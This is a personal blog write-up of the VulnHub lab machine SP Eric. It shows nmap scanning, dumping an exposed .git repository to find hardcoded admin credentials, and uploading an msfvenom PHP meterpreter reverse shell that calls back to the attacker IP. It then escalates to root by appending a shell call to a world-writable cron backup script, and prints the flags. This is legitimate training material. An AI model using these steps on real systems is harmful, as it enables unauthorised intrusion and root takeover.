<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>VulnHub: SP Eric - ben-dale.co.uk</title><meta name="viewport" content="width=device-width, initial-scale=1">

	<meta property="og:title" content="VulnHub: SP Eric" />
<meta property="og:description" content="My write-up for SP Eric, a VulnHub box created by Dsolstad." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/my-first-writeup/" />
<meta property="article:published_time" content="2020-02-09T00:00:00+00:00" />
<meta property="article:modified_time" content="2020-02-09T00:00:00+00:00" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="VulnHub: SP Eric"/>
<meta name="twitter:description" content="My write-up for SP Eric, a VulnHub box created by Dsolstad."/>
<link rel="stylesheet" type="text/css" media="screen" href="/css/normalize.css" />
	<link rel="stylesheet" type="text/css" media="screen" href="/css/main.css" />
	<link rel="stylesheet" type="text/css" media="screen" href="/css/all.css" />
</head>

<body>
	<div class="container wrapper">
		<div class="header">
	
		<div class="avatar">
			<a href="/">
				<img src="/static/img/logo.png" alt="ben-dale.co.uk" />
			</a>
		</div>
	
	<h1 class="site-title"><a href="/">ben-dale.co.uk</a></h1>
	<div class="site-description"><p>some guy that does some stuff</p><nav class="nav social">
			<ul class="flat"><li class="li-social"><a href="https://github.com/ben-dale"><i title="Github" class="icons fab fa-github"></i></a></li><li class="li-social"><a href="https://twitter.com/mrbenjamind"><i title="Twitter" class="icons fab fa-twitter"></i></a></li><li class="li-social"><a href="https://keybase.io/mrbenjamind"><i title="Keybase" class="icons fab fa-keybase"></i></a></li></ul>
		</nav>
	</div>

	<nav class="nav">
		<ul class="flat">
			
			<li>
				<a href="/">Home</a>
			</li>
			
			<li>
				<a href="/posts">All posts</a>
			</li>
			
		</ul>
	</nav>
</div>


		<div class="post">
			<div class="author">
				
			</div>
			<div class="post-header">
				
					<div class="meta">
						<div class="date">
							<span class="day">09</span>
							<span class="rest">Feb 2020</span>
						</div>
					</div>
				
				<div class="matter">
					<h1 class="title">VulnHub: SP Eric</h1>
				</div>
			</div>
			<div class="markdown">
				<p>This weekend I managed to fully root a <a href="https://www.vulnhub.com">VulnHub</a> box without looking at another person&rsquo;s write-up for a hint, for the first time! This box was created by <a href="https://dsolstad.com/vm/2019/03/09/Vulnerable-machines.html">Daniel Solstad</a> and can be downloaded <a href="https://www.vulnhub.com/entry/sp-eric,274/">here</a>. Here&rsquo;s my write-up.</p>
<h3 id="write-up">Write-up</h3>
<p>The description for this box states:</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Eric is trying to reach out on the Internet, but is he following best practice?
Flags:
- /root/flag.txt
- /home/eric/flag.txt
</code></pre></div><p>Once I had Eric set up and running I ran a port scan:</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali~/Documents/vulnhub/eric$ nmap -sC -sV -o nmap 10.0.2.17
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-08 16:13 EST
Nmap scan report for 10.0.2.17
Host is up (0.00038s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d3:79:15:3d:11:4c:af:26:6c:b2:af:6a:0b:99:14:fd (RSA)
|   256 87:48:76:38:81:c2:a0:50:cd:4c:39:c0:7c:7a:07:40 (ECDSA)
|_  256 8e:b9:dd:8d:14:9b:e3:63:1d:d7:0e:54:98:8d:29:5b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-git: 
|   10.0.2.17:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file &#39;description&#39; to name the...
|_    Last commit message: minor changes 
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Blog under construction
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p>Port 80 was exposed and Nmap also found a Git repository under <code>10.0.2.17:80/.git/</code>. Before I interrogated the git repository I took a look at what was running port 80.</p>
<p><img src="/static/sp-eric/1.png" alt=""></p>
<p>Viewing the source confirmed this was just some static placeholder content.</p>
<p><img src="/static/sp-eric/2.png" alt=""></p>
<p>It was time to take a look at that Git repo. Heading over to <code>10.0.2.17/.git</code> gave me a 403 so I did some research and came across of set of <a href="https://github.com/internetwache/GitTools">useful scripts</a>, one of which &ldquo;can be used to download as much as possible from the found .git repository from webservers which do not have directory listing enabled&rdquo;. I cloned the repo and ran the script:</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/Documents/vulnhub/eric$ /opt/GitTools/Dumper/./gitdumper.sh http://10.0.2.17/.git/ git
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating git/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[+] Downloaded: objects/3d/b5628b550f5c9c9f6f663cd158374035a6eaa0
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/cc/1ab96950f56d1fff0d1f006821cab6b6b0e249
[+] Downloaded: objects/a8/9a716b3c21d8f9fee38a0693afb22c75f1d31c
[+] Downloaded: objects/31/33d44be3eebe6c6761b50c6fdf5b7fb664c2d8
[+] Downloaded: objects/3d/8e9ce9093fc391845dd69b0436b258ac4a6387
[+] Downloaded: objects/f0/d95f54335626ce6c96522e0a9105780b3366c5
[+] Downloaded: objects/c0/951efcb330fc310911d714acf03b873aa9ab43
[+] Downloaded: objects/23/448969d5b347f8e91f8017b4d8ef6edf6161d8
[+] Downloaded: objects/e7/ba67226cda1ecc1bd3a2537f0be94343d448bb
</code></pre></div><p>Running <code>git status</code> in the dumped repository showed two files: <code>admin.php</code> and <code>index.php</code>.</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/Documents/vulnhub/eric/git$ git status
On branch master
Changes not staged for commit:
  (use &#34;git add/rm &lt;file&gt;...&#34; to update what will be committed)
  (use &#34;git restore &lt;file&gt;...&#34; to discard changes in working directory)
        deleted:    admin.php
        deleted:    index.php

no changes added to commit (use &#34;git add&#34; and/or &#34;git commit -a&#34;)
</code></pre></div><p>Running <code>git reset --hard</code> put the repo into a clean working state. I looked inside <code>admin.php</code> and found some useful information:</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/Documents/vulnhub/eric/git$ cat admin.php 
&lt;?php

ob_start();
session_start();

if ($_POST[&#39;submit&#39;]) {
    if ($_POST[&#39;username&#39;] == &#39;admin&#39; &amp;&amp; $_POST[&#39;password&#39;] == &#39;st@mpch0rdt.ightiRu$glo0mappL3&#39;) {
        $_SESSION[&#39;auth&#39;] = 1;
    } else {
        exit(&#34;Wrong username and/or password. Don&#39;t even bother bruteforcing.&#34;);
    }
}

// Todo: Make sure it is only allowed to upload images.
if ($_POST[&#39;submit_post&#39;]) {
    if (move_uploaded_file($_FILES[&#39;image&#39;][&#39;tmp_name&#39;], &#39;upload/&#39; . $_FILES[&#39;image&#39;][&#39;name&#39;])) {
    }
}
 
?&gt;

&lt;html&gt;
&lt;head&gt;
&lt;title&gt;admin login&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;?php
if (!isset($_SESSION[&#39;auth&#39;])) {
?&gt;
&lt;form action=&#34;admin.php&#34; method=&#34;post&#34;&gt;
&lt;input name=&#34;username&#34; type=&#34;text&#34; placeholder=&#34;Username&#34; /&gt;
&lt;input name=&#34;password&#34; type=&#34;password&#34; placeholder=&#34;Password&#34; /&gt;&lt;br /&gt;
&lt;input name=&#34;submit&#34; type=&#34;submit&#34; value=&#34;Login&#34;/&gt;
&lt;/form&gt;

&lt;?php
} else {
?&gt;

&lt;h1&gt;Add new post (under construction)&lt;/h1&gt;
&lt;form action=&#34;admin.php&#34; method=&#34;post&#34; enctype=&#34;multipart/form-data&#34;&gt;
&lt;input name=&#34;post_title&#34; type=&#34;text&#34; placeholder=&#34;Title&#34;&gt;&lt;br /&gt;
&lt;textarea name=&#34;post_body&#34; cols=&#34;40&#34; rows=&#34;3&#34; placeholder=&#34;Body&#34;&gt;&lt;/textarea&gt;&lt;br /&gt;
&lt;input name=&#34;image&#34; type=&#34;file&#34; placeholder=&#34;Image&#34; /&gt; 
&lt;input type=&#34;submit&#34; name=&#34;submit_post&#34; value=&#34;Upload&#34;/&gt;
&lt;/form&gt;

&lt;h1&gt;Add site to blogroll&lt;/h1&gt;
&lt;input name=&#34;blogroll_add&#34; type=&#34;text&#34;/&gt;&lt;br/&gt;
&lt;input name=&#34;blogroll_submit&#34; type=&#34;submit&#34; value=&#34;add&#34;/&gt;

&lt;?php
}
?&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div><p>The two things I noted were:</p>
<ol>
<li>Admin credentials hardcoded (<code>admin:st@mpch0rdt.ightiRu$glo0mappL3</code>)</li>
<li>Some function to allow admin users to upload files to an <code>upload</code> directory.</li>
</ol>
<p>Taking a look at <code>admin.php</code> in the browser presented me with a login form:</p>
<p><img src="/static/sp-eric/3.png" alt=""></p>
<p>I logged in with the hardcoded credentials I found inside <code>admin.php</code> and was redirected to an admin UI:</p>
<p><img src="/static/sp-eric/4.png" alt=""></p>
<p>Most of the screen was labelled &ldquo;(under construction)&rdquo; but reading the source code of <code>admin.php</code> made me think that the file upload mechanism was at least working. To quickly test this out I uploaded a test file (<code>test.txt</code>) that contained the string <code>abc123</code>. Clicking &ldquo;Upload&rdquo; didn&rsquo;t return any noticeable errors so I had a look at <code>10.0.2.17/upload/test.txt</code> and found my file&rsquo;s contents.</p>
<p><img src="/static/sp-eric/5.png" alt=""></p>
<p>Because Eric was capable of running and executing PHP, it was likely that I could set up a reverse shell by uploading a payload, executing it and listening out for the connection back from Eric.</p>
<p>The first step was to generate the payload, configuring the listening host to my machine&rsquo;s IP and listening port to some arbitrary port that wasn&rsquo;t used on my machine, in this case, 4000.</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/Documents/vulnhub/eric$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.2.15 LPORT=4000 -o shell.php
/usr/share/rubygems-integration/all/gems/bundler-1.17.3/lib/bundler/rubygems_integration.rb:200: warning: constant Gem::ConfigMap is deprecated
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 30685 bytes
Saved as: shell.php
</code></pre></div><p>The next step was to run the multi/handler exploit from <code>msfconsole</code> to listen out for the incoming connection from Eric:</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">msf5 &gt; use exploit/multi/handler
msf5 exploit(multi/handler) &gt; set payload php/meterpreter_reverse_tcp
payload =&gt; php/meterpreter_reverse_tcp
msf5 exploit(multi/handler) &gt; set LPORT 4000
LPORT =&gt; 4000
msf5 exploit(multi/handler) &gt; set LHOST 10.0.2.15
LHOST =&gt; 10.0.2.15
msf5 &gt; run
</code></pre></div><p>The final step was to upload <code>shell.php</code> and to visit <code>10.0.2.17/upload/shell.php</code> to execute the script. Once the script had executed I flipped back to <code>msfconsole</code>, saw that I had a connection and started poking around:</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">meterpreter &gt; ls
Listing: /var/www/html/upload
=============================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  30685  fil   2020-02-08 17:04:35 -0500  shell.php
100644/rw-r--r--  7      fil   2020-02-08 16:51:39 -0500  test.txt
</code></pre></div><p>I had a look inside <code>/etc/passwd</code> and found a user named &ldquo;eric&rdquo;, as previously hinted at in the description for the box.</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
eric:x:1001:1001:,,,:/home/eric:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
</code></pre></div><p>Inside <code>/home/eric</code> I found the first flag:</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">meterpreter &gt; cd /home/eric
meterpreter &gt; ls -al
Listing: /home/eric
===================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100600/rw-------  81     fil   2018-12-23 12:02:47 -0500  .bash_history
100644/rw-r--r--  220    fil   2018-10-28 07:53:24 -0400  .bash_logout
100644/rw-r--r--  3771   fil   2018-10-28 07:53:24 -0400  .bashrc
40700/rwx------   4096   dir   2018-10-28 09:00:02 -0400  .cache
40775/rwxrwxr-x   4096   dir   2018-10-28 09:00:11 -0400  .local
100644/rw-r--r--  807    fil   2018-10-28 07:53:24 -0400  .profile
100644/rw-r--r--  0      fil   2018-10-28 09:26:18 -0400  .sudo_as_admin_successful
100777/rwxrwxrwx  93     fil   2018-10-28 09:27:43 -0500  backup.sh
100644/rw-r--r--  31239  fil   2020-02-09 09:57:01 -0500  backup.zip
100644/rw-r--r--  13     fil   2018-10-28 09:29:18 -0400  flag.txt

meterpreter &gt; cat flag.txt
89340a834323
</code></pre></div><p>I also found an interesting couple of files: <code>backup.sh</code> and <code>backup.zip</code>. I didn&rsquo;t know what <code>.sudo_as_admin_successful</code> was, but it didn&rsquo;t have any content so I just left it. Looking inside <code>backup.sh</code> I found the following:</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; cat backup.sh
<span style="color:#888">#!/bin/bash</span>
zip -r /home/eric/backup.zip /var/www/html
</code></pre></div><p>Given the contents of <code>backup.sh</code> and the last modified date of <code>backup.zip</code>, one could presume that <code>backup.sh</code> is running on a cronjob periodically. At least, that&rsquo;s what I presumed. I tried looking around for the running cronjob configuration but because I was running as user <code>www-data</code> and (again, presumably) the cronjob was set up on either <code>root</code> or <code>eric</code> I didn&rsquo;t have permission to view the config. Either way, something somewhere was executing <code>backup.sh</code> every few minutes. I also noticed that <code>backup.sh</code> had all the perms, which meant I had permission to write to it.</p>
<p>I decided to set up another reverse shell, this time on port 7000, that would be initiated by <code>backup.sh</code>. I made a copy of the previously uploaded shell (located under <code>/var/www/html/upload/shell.php</code>) and changed the listening to 7000.</p>
<p>I added the following line to <code>backup.sh</code> so that when it was executed <code>shell_7000.php</code> would be executed and a reverse shell would be initiated:</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">php -f /var/www/html/upload/shell_7000.php
</code></pre></div><p>I went back to msfconsole and moved my current meterpreter session to the background, changed the listening port to 7000, and ran the listener again:</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">meterpreter &gt; background
[*] Backgrounding session 1...
msf5 exploit(multi/handler) &gt; set LPORT 7000
LPORT =&gt; 7000
msf5 exploit(multi/handler) &gt; run
</code></pre></div><p>After a few minutes a connection was initiated:</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[*] Started reverse TCP handler on 10.0.2.15:7000 
[*] Meterpreter session 2 opened (10.0.2.15:7000 -&gt; 10.0.2.17:55208)...
</code></pre></div><p>I dropped into a shell and found that I was running as the <code>root</code> user:</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">meterpreter &gt; shell
Process 995 created.
Channel 0 created.
whoami
root

cat flag.txt
6a347b975dd18ae6497c
</code></pre></div><h3 id="final-thoughts">Final thoughts</h3>
<p>I had a lot of fun working through this box, and I&rsquo;m having a lot of fun learning about a whole new area of expertise. A number of times I was left scratching my head trying to figure out the next steps, sometimes stepping away for an hour or so, or coming back to it the next morning. I pressed on and eventually managed to get to a solution.</p>
<p>As a programmer I know the value in stepping away from a problem for a bit, going for a walk or grabbing some food, waiting for that &ldquo;eureka&rdquo; moment. It turns out it&rsquo;s just as applicable in this context too!</p>

			</div>
			<div class="tags">
				
				
				
				
					
				
					
				
				
			</div></div>
	</div>
	<div class="footer wrapper">
	<nav class="nav">
		<div class="footertext"></div>
	</nav>
</div>



</body>
</html>
